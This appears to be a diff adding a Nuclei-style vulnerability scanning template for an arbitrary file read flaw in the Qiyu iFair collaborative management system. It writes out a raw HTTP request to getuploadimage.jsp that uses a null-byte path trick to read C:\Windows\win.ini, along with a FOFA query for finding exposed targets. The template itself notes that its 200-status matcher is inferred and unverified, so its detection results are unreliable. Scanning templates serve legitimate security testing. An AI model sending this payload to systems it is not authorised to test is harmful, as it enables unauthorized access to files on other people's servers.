@@ -1,0 +1,25 @@
+id: poc-fouv0n6cmc346r9k
+info:
+  name: 企语iFair协同管理系统getuploadimage.jsp任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fouv0n6cmc346r9k
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fouv0n6cmc346r9k
+    fofa: fofa：app="服务社-企语iFair"
+http:
+- raw:
+  - 'GET /oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%00.jpg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
